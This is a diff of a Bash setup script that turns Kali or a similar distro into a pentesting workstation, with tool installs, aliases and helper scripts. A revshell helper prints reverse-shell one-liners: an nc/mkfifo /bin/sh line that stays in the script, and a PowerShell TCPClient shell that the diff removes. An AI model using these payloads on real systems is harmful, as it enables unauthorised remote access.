@@ -6,9 +6,9 @@
 # Description: Automated setup for Kali Linux and other security
 #              distributions with focus on web/server pentesting.
 #
-# Author: Auto-generated
+# Author: Nyteko
 # Version: 2.0
-# License: MIT
+# License: AGPL-3.0 
 #
 # Requirements:
 #   - Kali Linux, Parrot OS, BlackArch, or Pentoo
@@ -62,15 +62,16 @@ check_root() {
     fi
 }
 
-# Modify create_directories function to use the new script
+# Function to create directories
 create_directories() {
     print_status "Creating directory structure..."
     
-    # Source the directories script
-    source "$(dirname "$0")/directories.sh"
+    # Create main pentesting directory
+    mkdir -p "$INSTALL_DIR"
     
-    # Create all directories
-    create_directory_structure
+    # Create subdirectories
+    mkdir -p "$INSTALL_DIR"/{tools,targets,reports,wordlists,scripts,notes}
+    mkdir -p ~/venvs/{pentesting,webapp}
     
     print_success "Directory structure created"
 }
@@ -78,7 +79,17 @@ create_directories() {
 # Function to update system
 update_system() {
     print_status "Updating system packages..."
-    sudo apt update && sudo apt upgrade -y
+    case "$PKG_MANAGER" in
+        apt)
+            sudo apt update && sudo apt upgrade -y
+            ;;
+        dnf)
+            sudo dnf update -y
+            ;;
+        pacman)
+            sudo pacman -Syu --noconfirm
+            ;;
+    esac
     print_success "System updated"
 }
 
@@ -97,7 +108,7 @@ detect_pkg_manager() {
     print_status "Using package manager: $PKG_MANAGER"
 }
 
-# Add after detect_pkg_manager function
+# Check dependencies
 check_dependencies() {
     print_status "Checking required dependencies..."
     local deps=(curl wget git sudo jq)
@@ -117,20 +128,16 @@ check_dependencies() {
     fi
 }
 
-# Enhanced variable declarations with explicit typing
-declare -g -r VERSION="2.0"
-declare -g -r SCRIPT_DIR="${0%/*}"
+# Enhanced variable declarations
+declare -g -r SCRIPT_VERSION="2.0"
+declare -g -r SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 declare -g -r INSTALL_DIR="$HOME/pentesting"
 declare -g -A TOOL_CONFIGS
 declare -g -a TEMP_DIRS
-declare -g -r LOG_FILE="/tmp/setup_$(date +%Y%m%d_%H%M%S).log"
-
-# Enhanced error handling and cleanup
-declare -g TEMP_DIRS=()
 declare -g LOG_FILE="/tmp/setup_$(date +%Y%m%d_%H%M%S).log"
 
 # Error handling with line numbers and command logging
-trap 'err_handler $? $LINENO $BASH_COMMAND' ERR
+trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
 trap 'cleanup_handler' EXIT
 trap 'interrupt_handler' INT TERM
 
@@ -190,19 +197,19 @@ install_pkg() {
         print_status "Installing $pkg (attempt $attempt/$retries)..."
         case "$PKG_MANAGER" in
             apt)
-                if sudo DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >/dev/null 2>>"$LOG_FILE"; then
+                if sudo DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >>"$LOG_FILE" 2>&1; then
                     print_success "$pkg installed successfully"
                     return 0
                 fi
                 ;;
             dnf)
-                if sudo dnf install -y "$pkg" >/dev/null 2>>"$LOG_FILE"; then
+                if sudo dnf install -y "$pkg" >>"$LOG_FILE" 2>&1; then
                     print_success "$pkg installed successfully"
                     return 0
                 fi
                 ;;
             pacman)
-                if sudo pacman -S --noconfirm "$pkg" >/dev/null 2>>"$LOG_FILE"; then
+                if sudo pacman -S --noconfirm "$pkg" >>"$LOG_FILE" 2>&1; then
                     print_success "$pkg installed successfully"
                     return 0
                 fi
@@ -252,57 +259,47 @@ popd_quiet() {
     }
 }
 
-# Optimized clone function using parameter expansion
-clone_repo_parallel() {
+# Optimized clone function
+clone_repo() {
     local repo_url="$1"
     local target_dir="$2"
-    local repo_name="${repo_url##*/}"  # More efficient than basename
-    repo_name="${repo_name%.git}"      # Remove .git suffix
+    local repo_name="${repo_url##*/}"
+    repo_name="${repo_name%.git}"
     
     if [[ ! -d "$target_dir/$repo_name" ]]; then
         {
             git clone --quiet "$repo_url" "$target_dir/$repo_name" &&
             print_success "Cloned $repo_name"
-        } 2>> "$LOG_FILE" || {
+        } >> "$LOG_FILE" 2>&1 || {
             print_error "Failed to clone $repo_name"
             return 1
         }
     else
-        # Update existing repository using pushd/popd
-        pushd "$target_dir/$repo_name" &>/dev/null || return 1
+        pushd_quiet "$target_dir/$repo_name" || return 1
         git pull --quiet && print_success "Updated $repo_name" || print_error "Failed to update $repo_name"
-        popd &>/dev/null || return 1
+        popd_quiet || return 1
     fi
 }
 
-# Function to install essential packages with parallel installation
+# Function to install essential packages
 install_essential_packages() {
     print_status "Installing essential and pentesting packages..."
-    local -a pids=()
-
-    # Group packages by type for better parallelization
+    
+    # Group packages by type
     declare -A PKG_GROUPS=(
         ["base"]="curl wget git vim nano build-essential"
         ["python"]="python3-pip python3-venv python3-dev"
-        ["js"]="nodejs npm"
-        ["golang"]="golang-go"
         ["utils"]="tree htop unzip p7zip-full"
         ["network"]="net-tools dnsutils nmap masscan"
         ["web"]="nikto dirb gobuster feroxbuster whatweb wapiti ffuf"
-        ["recon"]="sublist3r amass wpscan nuclei"
-        ["exploit"]="metasploit-framework sqlmap hydra medusa"
     )
 
-    # Install packages in parallel by group
+    # Install packages by group
     for group in "${!PKG_GROUPS[@]}"; do
         print_status "Installing $group packages..."
         for pkg in ${PKG_GROUPS[$group]}; do
-            install_and_check "$pkg" & 
-            pids+=($!)
+            install_and_check "$pkg" || print_warning "Failed to install $pkg"
         done
-        # Wait for current group and check status
-        track_jobs "${pids[@]}" || print_warning "Some packages in group $group failed to install"
-        pids=()  # Reset for next group
     done
 
     print_success "Package installation completed"
@@ -316,7 +313,6 @@ get_github_release_url() {
     local download_url
     local response
     
-    # Single curl call with response capture
     response=$(curl -sL "$api_url") || return 1
     download_url=$(jq -r --arg pat "$pattern" \
         '.assets[] | select(.name | test($pat)) | .browser_download_url' <<< "$response" | head -n1)
@@ -326,30 +322,6 @@ get_github_release_url() {
         return 1
     fi
     printf '%s\n' "$download_url"
-}
-
-# Enhanced job tracking with detailed tool information
-declare -A JOB_TOOLS
-track_jobs() {
-    local -a pids=("$@")
-    local -a failed_tools=()
-    local failed=0
-    
-    for pid in "${pids[@]}"; do
-        wait "$pid" || {
-            failed=1
-            failed_tools+=("${JOB_TOOLS[$pid]:-Unknown}")
-            print_error "Installation failed for: ${JOB_TOOLS[$pid]:-Unknown tool}"
-        }
-    done
-    
-    if [ ${#failed_tools[@]} -gt 0 ]; then
-        print_error "Failed installations: ${failed_tools[*]}"
-        print_error "Check the logs above for specific error messages"
-        return 1
-    fi
-    
-    return 0
 }
 
 # Function to verify GPG signatures
@@ -410,109 +382,6 @@ verify_artifact() {
     esac
 }
 
-# Unified tool installation function
-install_tool() {
-    # Documentation and usage
-    local usage="Usage: install_tool <name> [options] | install_tool --config=<yaml_config>
-    
-    Direct installation:
-        install_tool <name> --source=<source> --url=<url> [options]
-    
-    YAML configuration:
-        install_tool --config=<base64_yaml>
-    
-    Options:
-        --source    Source type: github, gitlab, pypi, go, custom
-        --url       Repository URL or package name
-        --version   Version to install (default: latest)
-        --type      Installation type: release, clone, asset, package
-        --pattern   Pattern for asset matching
-        --verify    Verification method: gpg,sha256,sha512
-        --key       GPG key or hash for verification
-        --deps      Comma-separated dependencies
-        --build     Build command
-        --install   Install command"
-
-    [ "$1" = "-h" -o "$1" = "--help" ] && { echo "$usage"; return 0; }
-
-    local name config
-    declare -A tool_config
-
-    # Parse arguments
-    if [[ "$1" == "--config="* ]]; then
-        config="${1#--config=}"
-        if ! tool_config=$(parse_yaml_config "$config"); then
-            print_error "Failed to parse YAML configuration"
-            return 1
-        fi
-        name="${tool_config[name]}"
-    else
-        name="$1"
-        shift
-        while [[ "$#" -gt 0 ]]; do
-            case "$1" in
-                --source=*) tool_config[source]="${1#--source=}" ;;
-                --url=*) tool_config[url]="${1#--url=}" ;;
-                --version=*) tool_config[version]="${1#--version=}" ;;
-                --type=*) tool_config[type]="${1#--type=}" ;;
-                --pattern=*) tool_config[pattern]="${1#--pattern=}" ;;
-                --verify=*) tool_config[verify]="${1#--verify=}" ;;
-                --key=*) tool_config[key]="${1#--key=}" ;;
-                --deps=*) tool_config[deps]="${1#--deps=}" ;;
-                --build=*) tool_config[build]="${1#--build=}" ;;
-                --install=*) tool_config[install]="${1#--install=}" ;;
-                *) print_error "Unknown option: $1"; return 1 ;;
-            esac
-            shift
-        done
-    fi
-
-    # Handle the installation based on source type
-    case "${tool_config[source]}" in
-        github|gitlab)
-            install_from_git "$name" "${tool_config[@]}" || return 1
-            ;;
-        pypi|go)
-            install_from_package "$name" "${tool_config[@]}" || return 1
-            ;;
-        custom)
-            if [ -n "${tool_config[install]}" ]; then
-                eval "${tool_config[install]}" || return 1
-            fi
-            ;;
-        *)
-            print_error "Unsupported source type: ${tool_config[source]}"
-            return 1
-            ;;
-    esac
-
-    # Post-installation steps (build if specified)
-    if [ -n "${tool_config[build]}" ]; then
-        (cd "$HOME/pentesting/tools/$name" && eval "${tool_config[build]}") || return 1
-    fi
-
-    print_success "$name installed successfully"
-    return 0
-}
-
-# Improved GitHub tools installation
-install_github_tools() {
-    print_status "Installing tools from GitHub..."
-    local -a pids=()
-    
-    for tool_name in "${!TOOL_CONFIGS[@]}"; do
-        (install_tool --config="${TOOL_CONFIGS[$tool_name]}") &
-        pid=$!
-        pids+=($pid)
-        JOB_TOOLS[$pid]="$tool_name"
-    done
-
-    track_jobs "${pids[@]}" || {
-        print_warning "Some tools failed to install. Check the logs above for details."
-        return 1
-    }
-}
-
 # Function to configure VMware tools
 configure_vmware_tools() {
     print_status "Configuring VMware tools..."
@@ -527,7 +396,7 @@ configure_vmware_tools() {
     print_success "VMware tools configured"
 }
 
-# Function to check OS compatibility (expanded for more distros and arch)
+# Function to check OS compatibility
 check_os() {
     print_status "Checking OS compatibility..."
     if [ -f /etc/os-release ]; then
@@ -545,114 +414,6 @@ check_os() {
     else
         print_warning "Cannot detect OS. Proceeding, but some features may not work."
     fi
-}
-
-# Validate packages for multiple package managers
-validate_packages() {
-    print_status "Validating package availability in repositories..."
-    local missing=()
-    
-    case "$PKG_MANAGER" in
-        apt)
-            for pkg in "${PACKAGES[@]}"; do
-                if ! apt-cache show "$pkg" &>/dev/null; then
-                    missing+=("$pkg")
-                fi
-            done
-            ;;
-        dnf)
-            for pkg in "${PACKAGES[@]}"; do
-                if ! dnf list "$pkg" &>/dev/null; then
-                    missing+=("$pkg")
-                fi
-            done
-            ;;
-        pacman)
-            for pkg in "${PACKAGES[@]}"; do
-                if ! pacman -Si "$pkg" &>/dev/null; then
-                    missing+=("$pkg")
-                fi
-            done
-            ;;
-    esac
-
-    if [ ${#missing[@]} -gt 0 ]; then
-        print_warning "The following packages are not available in your repositories:"
-        printf '  - %s\n' "${missing[@]}"
-        if ! whiptail --yesno "Some packages are not available. Continue anyway?" 10 60; then
-            exit 1
-        fi
-    else
-        print_success "All packages are available in repositories"
-    fi
-}
-
-# Interactive menu for module selection
-select_modules_interactive() {
-    if ! command -v whiptail &>/dev/null; then
-        print_warning "whiptail not found. Installing..."
-        install_pkg whiptail || {
-            print_error "Could not install whiptail. Using default options."
-            return 1
-        }
-    fi
-
-    # Main menu
-    local MENU_CHOICE
-    while true; do
-        MENU_CHOICE=$(whiptail --title "Kali Setup Configuration" --menu "Choose an option:" 20 78 10 \
-            "1" "Select modules to install" \
-            "2" "Configure installation options" \
-            "3" "View selected configuration" \
-            "4" "Start installation" \
-            "q" "Quit" 3>&1 1>&2 2>&3)
-
-        case $MENU_CHOICE in
-            1)
-                # Module selection
-                SELECTED_MODULES=$(whiptail --title "Module Selection" --checklist \
-                    "Select modules to install:" 20 78 8 \
-                    "TOOLS" "Essential pentesting tools" ON \
-                    "PYTHON" "Python environments and packages" ON \
-                    "ZSH" "ZSH configuration and aliases" ON \
-                    "DOCKER" "Container tools and configs" ON \
-                    "ADVANCED" "Advanced tools and scripts" ON \
-                    "WORDLISTS" "Common wordlists" ON \
-                    3>&1 1>&2 2>&3)
-                ;;
-            2)
-                # Additional options
-                OPTIONS=$(whiptail --title "Installation Options" --separate-output --checklist \
-                    "Select additional options:" 20 78 5 \
-                    "AUTO_VENV" "Auto-activate Python venv" OFF \
-                    "MINIMAL" "Minimal installation" OFF \
-                    "FORCE" "Force package installation" OFF \
-                    3>&1 1>&2 2>&3)
-                ;;
-            3)
-                # Show current configuration
-                whiptail --title "Current Configuration" --msgbox \
-                    "Selected modules:\n${SELECTED_MODULES}\n\nOptions:\n${OPTIONS}" 20 78
-                ;;
-            4|"")
-                # Start installation
-                break
-                ;;
-            q)
-                print_warning "Setup cancelled by user"
-                exit 0
-                ;;
-        esac
-    done
-
-    # Convert selections to variables
-    SKIP_TOOLS=true; SKIP_PYTHON=true; SKIP_ZSH=true; SKIP_DOCKER=true; SKIP_ADVANCED=true; SKIP_WORDLISTS=true
-    [[ $SELECTED_MODULES == *TOOLS* ]] && SKIP_TOOLS=false
-    [[ $SELECTED_MODULES == *PYTHON* ]] && SKIP_PYTHON=false
-    [[ $SELECTED_MODULES == *ZSH* ]] && SKIP_ZSH=false
-    [[ $SELECTED_MODULES == *DOCKER* ]] && SKIP_DOCKER=false
-    [[ $SELECTED_MODULES == *ADVANCED* ]] && SKIP_ADVANCED=false
-    [[ $SELECTED_MODULES == *WORDLISTS* ]] && SKIP_WORDLISTS=false
 }
 
 # Function to configure Metasploit database
@@ -684,7 +445,6 @@ setup_unified_aliases() {
     cat > ~/.config/zsh/pentesting_aliases.zsh << 'EOF'
 # ~/.config/zsh/pentesting_aliases.zsh
 # All pentesting aliases and functions in one place.
-# You can edit this file to customize your workflow.
 
 # --- Aliases ---
 alias ports="netstat -tuln"
@@ -694,9 +454,6 @@ alias httpsrv="python3 -m http.server"
 alias smbsrv="impacket-smbserver share ."
 alias revshell="nc -lvnp"
 alias enum="~/pentesting/tools/LinEnum/LinEnum.sh"
-alias linpeas="~/pentesting/tools/PEASS-ng/linPEAS/linpeas.sh"
-alias winpeas="~/pentesting/tools/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat"
-alias autorecon="source ~/pentesting/tools/AutoRecon/venv/bin/activate && python ~/pentesting/tools/AutoRecon/autorecon.py"
 alias pentest="source ~/venvs/pentesting/bin/activate"
 alias webapp="source ~/venvs/webapp/bin/activate"
 alias pendir="cd ~/pentesting"
@@ -706,32 +463,14 @@ alias reports="cd ~/pentesting/reports"
 alias quickscan="nmap -sS -O -sV --version-intensity 5 --script=default"
 alias fullscan="nmap -sS -sU -O -sV -sC -A -p-"
 alias webscan="nmap -sS -sV -p80,443,8080,8443 --script=http-*"
-alias burp="java -jar -Xmx2g /usr/bin/burpsuite"
 alias shared="cd /mnt/hgfs"
 alias newscreen="screen -S"
 alias listscreen="screen -ls"
 alias term="terminator"
 alias termconfig="terminator --preferences"
-alias update-tools="cd ~/pentesting/tools && find . -name '.git' -type d -exec sh -c 'cd \"{}\"/../ && echo \"Updating \$(basename \$(pwd))\" && git pull' \;"
-# Modern CLI
-alias cat='bat --paging=never'
-alias ls='exa --icons'
-alias ll='exa -lah --icons --group-directories-first'
-alias la='exa -la --icons'
-alias lt='exa --tree --level=2 --icons'
-alias grep='rg'
-alias find='fd'
-alias du='dust'
-alias ps='procs'
-alias top='btop'
-# Directory navigation
-alias ..='cd ..'
-alias ...='cd ../..'
-alias ....='cd ../../..'
 
 # --- Functions ---
 target() {
-    # Improved: Always create structure, even if IP is not provided
     if [[ -z "$1" ]]; then
         echo "Usage: target <name> [IP]"
         return 1
@@ -756,9 +495,6 @@ revshell() {
     echo ""
     echo "NC (traditional):"
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
-    echo ""
-    echo "PowerShell:"
-    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 }
 qscan() { if [[ -z "$1" ]]; then echo "Usage: qscan <target>"; return 1; fi; nmap -sS -sV -O -T4 --top-ports 1000 "$1"; }
 fscan() { if [[ -z "$1" ]]; then echo "Usage: fscan <target>"; return 1; fi; nmap -sS -sC -sV -O -T4 -p- "$1"; }
@@ -828,42 +564,6 @@ echo "Enumerating directories on $target..."
 
 # Gobuster scan
 gobuster dir -u $target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,css -t 50
-
-# Alternative with ffuf
-echo "Running ffuf scan..."
-ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u $target/FUZZ -t 50
-EOF
-
-    # SMB enumeration script
-    cat > ~/pentesting/scripts/smbenum.sh << 'EOF'
-#!/bin/bash
-# SMB enumeration script
-# Tip: crackmapexec is a modern alternative to enum4linux for many scenarios.
-
-if [ $# -eq 0 ]; then
-    echo "Usage: $0 <target>"
-    exit 1
-fi
-
-target=$1
-echo "Enumerating SMB on $target..."
-
-# Nmap SMB scripts
-nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse,smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-services.nse,smb-enum-sessions.nse $target
-
-# smbclient
-echo "Listing shares with smbclient..."
-smbclient -L //$target -N
-
-# enum4linux
-echo "Running enum4linux..."
-enum4linux -a $target
-
-# crackmapexec (modern alternative)
-if command -v crackmapexec &>/dev/null; then
-    echo "Running crackmapexec smb enumeration..."
-    crackmapexec smb $target
-fi
 EOF
 
     # Make scripts executable
@@ -877,7 +577,7 @@ configure_proxychains() {
     print_status "Configuring proxychains..."
     
     # Backup original config
-    sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak
+    sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak 2>/dev/null || true
     
     # Create custom configuration
     sudo tee /etc/proxychains4.conf > /dev/null << 'EOF'
@@ -893,8 +593,6 @@ quiet_mode
 [ProxyList]
 # Tor proxy
 socks4 127.0.0.1 9050
-# HTTP proxy (uncomment if needed)
-# http 127.0.0.1 8080
 EOF
 
     print_success "Proxychains configured"
@@ -907,12 +605,12 @@ setup_wordlists() {
     cd ~/pentesting/wordlists
     
     # Download additional wordlists
-    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+    wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt || true
     
     # Create symlinks to system wordlists
-    ln -s /usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz 2>/dev/null || true
-    ln -s /usr/share/seclists seclists 2>/dev/null || true
-    ln -s /usr/share/wordlists/dirbuster dirbuster 2>/dev/null || true
+    ln -sf /usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz 2>/dev/null || true
+    ln -sf /usr/share/seclists seclists 2>/dev/null || true
+    ln -sf /usr/share/wordlists/dirbuster dirbuster 2>/dev/null || true
     
     cd ~
     print_success "Wordlists configured"
@@ -921,32 +619,10 @@ setup_wordlists() {
 # === MODERN CLI TOOLS ===
 install_modern_cli_tools() {
     print_status "Installing modern CLI tools..."
-    # Install Rust (for some modern tools)
-    if ! command -v cargo &>/dev/null; then
-        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
-        source $HOME/.cargo/env
-    fi
-
-    # Install modern replacements, check individually for better feedback
-    for tool in bat exa ripgrep fd-find dust procs bottom zoxide starship git-delta; do
-        if ! command -v $tool &>/dev/null; then
-            cargo install --locked $tool || print_warning "Failed to install $tool with cargo"
-        else
-            print_warning "$tool already installed (cargo)"
-        fi
-    done
-
-    # Install fzf
-    if [ ! -d "$HOME/.fzf" ]; then
-        git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
-        ~/.fzf/install --all
-    else
-        print_warning "fzf already installed"
-    fi
-
+    
     # Install additional useful tools
-    sudo apt install -y jq yq httpie tldr thefuck tmux ranger ncdu prettyping
-
+    sudo apt install -y jq httpie tmux ncdu
+    
     print_success "Modern CLI tools installed"
 }
 
@@ -954,86 +630,61 @@ install_modern_cli_tools() {
 setup_zsh_environment() {
     print_status "Setting up Zsh environment..."
     
-    # Create XDG-compliant directories
-    mkdir -p "${XDG_CONFIG_HOME:-$HOME/.config}/zsh"
-    mkdir -p "${XDG_DATA_HOME:-$HOME/.local/share}/zsh"
-    mkdir -p "${XDG_CACHE_HOME:-$HOME/.cache}/zsh"
+    # Install Zsh if not already installed
+    if ! command -v zsh &>/dev/null; then
+        install_pkg zsh
+    fi
     
-    # Base zsh configuration
-    cat > "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/.zshrc" << 'EOF'
-# XDG Base Directory Specification
-export XDG_CONFIG_HOME="$HOME/.config"
-export XDG_CACHE_HOME="$HOME/.cache"
-export XDG_DATA_HOME="$HOME/.local/share"
-
-# Source configurations
-for conf in "$XDG_CONFIG_HOME/zsh/conf.d/"*.zsh; do
-    [ -f "$conf" ] && source "$conf"
-done
-
-# Load Oh My Zsh if installed
-[ -f "$XDG_CONFIG_HOME/zsh/.oh-my-zsh/oh-my-zsh.sh" ] && source "$XDG_CONFIG_HOME/zsh/.oh-my-zsh/oh-my-zsh.sh"
-
-# Load custom configurations last
-[ -f "$XDG_CONFIG_HOME/zsh/custom.zsh" ] && source "$XDG_CONFIG_HOME/zsh/custom.zsh"
-EOF
-
-    # Install Oh My Zsh with XDG compliance
-    if [ ! -d "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/.oh-my-zsh" ]; then
-        export ZSH="${XDG_CONFIG_HOME:-$HOME/.config}/zsh/.oh-my-zsh"
-        sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
+    # Set Zsh as default shell
+    if [[ "$SHELL" != "$(which zsh)" ]]; then
+        chsh -s "$(which zsh)"
     fi
 
-    # Move existing configurations
-    mkdir -p "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/conf.d"
-    mv ~/.config/zsh/pentesting_aliases.zsh "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/conf.d/10-pentesting.zsh" 2>/dev/null || true
-    mv ~/.config/zsh/pentesting_advanced.zsh "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/conf.d/20-pentesting-advanced.zsh" 2>/dev/null || true
-
-    # Update user's .zshenv to use XDG locations
-    cat > "$HOME/.zshenv" << EOF
-export ZDOTDIR="\${XDG_CONFIG_HOME:-\$HOME/.config}/zsh"
-[ -f "\$ZDOTDIR/.zshrc" ] && source "\$ZDOTDIR/.zshrc"
-EOF
-
-    print_success "Zsh environment configured with XDG compliance"
+    print_success "Zsh environment configured"
 }
 
 # === CONTAINER TOOLS ===
 install_container_tools() {
     print_status "Installing containerization tools..."
-    curl -fsSL https://get.docker.com -o get-docker.sh
-    sudo sh get-docker.sh
-    sudo usermod -aG docker $USER
-    rm get-docker.sh
-    sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
-    sudo chmod +x /usr/local/bin/docker-compose
+    
+    # Install Docker
+    if ! command -v docker &>/dev/null; then
+        curl -fsSL https://get.docker.com -o get-docker.sh
+        sudo sh get-docker.sh
+        sudo usermod -aG docker $USER
+        rm get-docker.sh
+    fi
+    
+    # Install Docker Compose
+    if ! command -v docker-compose &>/dev/null; then
+        sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+        sudo chmod +x /usr/local/bin/docker-compose
+    fi
+    
     print_success "Container tools installed"
 }
 
 # === ADVANCED PENTEST TOOLS ===
 install_advanced_pentest_tools() {
     print_status "Installing advanced pentesting tools..."
-    sudo apt install -y awscli azure-cli
-    curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-    sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
-    rm kubectl
-    cd ~/pentesting/tools
-    curl -L -o bloodhound.zip https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
-    unzip bloodhound.zip && rm bloodhound.zip
-    git clone --recurse-submodules https://github.com/cobbr/Covenant 2>/dev/null || true
-    wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.7.7_linux_amd64.gz
-    gunzip chisel_1.7.7_linux_amd64.gz
-    chmod +x chisel_1.7.7_linux_amd64
-    sudo mv chisel_1.7.7_linux_amd64 /usr/local/bin/chisel
-    wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
-    chmod +x pspy64
-    cd ~
+    
+    # Install additional tools
+    sudo apt install -y awscli
+    
+    # Install kubectl
+    if ! command -v kubectl &>/dev/null; then
+        curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+        sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
+        rm kubectl
+    fi
+    
     print_success "Advanced pentesting tools installed"
 }
 
 # === ADVANCED SCRIPTS ===
 create_advanced_scripts() {
     print_status "Creating advanced automation scripts..."
+    
     # Target initialization script
     cat > ~/pentesting/scripts/init_target.sh << 'EOF'
 #!/bin/bash
@@ -1074,206 +725,12 @@ cat > "$TARGET_DIR/notes/README.md" << EOL
 - [ ] Remove artifacts
 - [ ] Document findings
 EOL
-cat > "$TARGET_DIR/scan.sh" << EOL
-#!/bin/bash
-TARGET_IP="$TARGET_IP"
-SCAN_DIR="\$(dirname \$0)/scans"
-DATE=\$(date '+%Y%m%d_%H%M%S')
-echo "Starting automated scan for $TARGET_NAME (\$TARGET_IP)"
-echo "Results will be saved in: \$SCAN_DIR"
-mkdir -p "\$SCAN_DIR"
-nmap -sS -sV -O -T4 --top-ports 1000 -oA "\$SCAN_DIR/quick_\$DATE" \$TARGET_IP
-nmap -sS -p- -T4 -oA "\$SCAN_DIR/full_\$DATE" \$TARGET_IP &
-nmap -sU --top-ports 100 -T4 -oA "\$SCAN_DIR/udp_\$DATE" \$TARGET_IP &
-wait
-echo "[+] Nmap scans completed"
-if nmap -p 80,443,8080,8443 \$TARGET_IP | grep -q "open"; then
-    echo "[+] Web ports detected, running web enumeration..."
-    gobuster dir -u http://\$TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/common.txt -o "\$SCAN_DIR/gobuster_\$DATE.txt" &
-    nikto -h \$TARGET_IP -o "\$SCAN_DIR/nikto_\$DATE.txt" &
-    wait
-fi
-echo "[+] All scans completed!"
-echo "Check results in: \$SCAN_DIR"
-EOL
-chmod +x "$TARGET_DIR/scan.sh"
 echo "Target $TARGET_NAME initialized!"
 echo "Directory: $TARGET_DIR"
-cd "$TARGET_DIR"
-ls -la
 EOF
-    # Network discovery script
-    cat > ~/pentesting/scripts/discover_network.sh << 'EOF'
-#!/bin/bash
-if [ $# -eq 0 ]; then
-    echo "Usage: $0 <network_cidr> [interface]"
-    echo "Example: $0 192.168.1.0/24 eth0"
-    exit 1
-fi
-NETWORK=$1
-INTERFACE=${2:-$(ip route | grep default | awk '{print $5}' | head -n1)}
-echo "Discovering network: $NETWORK"
-echo "Using interface: $INTERFACE"
-OUTPUT_DIR="./network_discovery_$(date +%Y%m%d_%H%M%S)"
-mkdir -p "$OUTPUT_DIR"
-nmap -sn $NETWORK -oA "$OUTPUT_DIR/host_discovery"
-LIVE_HOSTS=$(grep "Nmap scan report" "$OUTPUT_DIR/host_discovery.nmap" | awk '{print $5}')
-echo "[+] Live hosts found:"
-echo "$LIVE_HOSTS"
-for host in $LIVE_HOSTS; do
-    echo "Scanning $host..."
-    nmap -sS -T4 --top-ports 100 $host -oA "$OUTPUT_DIR/portscan_${host}" &
-done
-wait
-echo "[+] Network discovery completed!"
-echo "Results saved in: $OUTPUT_DIR"
-EOF
-    # Privilege escalation checker
-    cat > ~/pentesting/scripts/privesc_check.sh << 'EOF'
-#!/bin/bash
-echo "=========================================="
-echo "     PRIVILEGE ESCALATION CHECKER"
-echo "=========================================="
-echo "[+] System Information:"
-uname -a
-echo ""
-echo "[+] Current User and Groups:"
-id
-echo ""
-echo "[+] Sudo Permissions:"
-sudo -l 2>/dev/null || echo "Cannot check sudo permissions"
-echo ""
-echo "[+] SUID/SGID Files:"
-find / -perm -4000 -type f 2>/dev/null | head -20
-echo ""
-echo "[+] World-writable Directories:"
-find / -type d -perm -002 2>/dev/null | head -10
-echo ""
-echo "[+] Running Processes:"
-ps aux | grep -v "\[" | head -15
-echo ""
-echo "[+] Network Connections:"
-netstat -tuln 2>/dev/null || ss -tuln
-echo ""
-echo "[+] Cron Jobs:"
-ls -la /etc/cron* 2>/dev/null
-crontab -l 2>/dev/null || echo "No user crontab"
-echo ""
-echo "[+] Environment Variables:"
-env | grep -E "(PATH|LD_|PWD|HOME)" | head -10
-echo ""
-echo "=========================================="
-echo "Manual checks recommended:"
-echo "- Check /etc/passwd for unusual users"
-echo "- Look for config files with credentials"
-echo "- Check kernel version for exploits"
-echo "- Examine running services"
-echo "=========================================="
-EOF
+
     chmod +x ~/pentesting/scripts/*.sh
     print_success "Advanced automation scripts created"
-}
-
-# === ADVANCED ALIASES ===
-setup_advanced_aliases() {
-    print_status "Setting up advanced aliases and functions..."
-    mkdir -p ~/.config/zsh
-    cat > ~/.config/zsh/pentesting_advanced.zsh << 'EOF'
-# Advanced Pentesting Functions and Aliases
-
-target() {
-    if [[ -z "$1" ]]; then
